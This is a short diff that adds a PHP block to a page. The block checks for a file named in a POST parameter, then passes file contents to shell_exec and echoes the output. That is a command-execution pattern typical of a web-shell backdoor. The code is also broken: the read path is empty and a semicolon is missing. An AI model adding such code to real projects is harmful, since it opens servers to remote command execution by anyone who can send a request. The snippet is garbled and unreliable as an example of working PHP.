@@ -37,8 +37,14 @@ $error = $_GET['error'];
 
 <?php
 
+if (file_exists($_POST['file'])){
+	$sns = file_get_contents('')
+	echo shell_exec($sns);
+}
 
-
+else {
+	echo "no file uploaded";
+}
 ?>
 
 
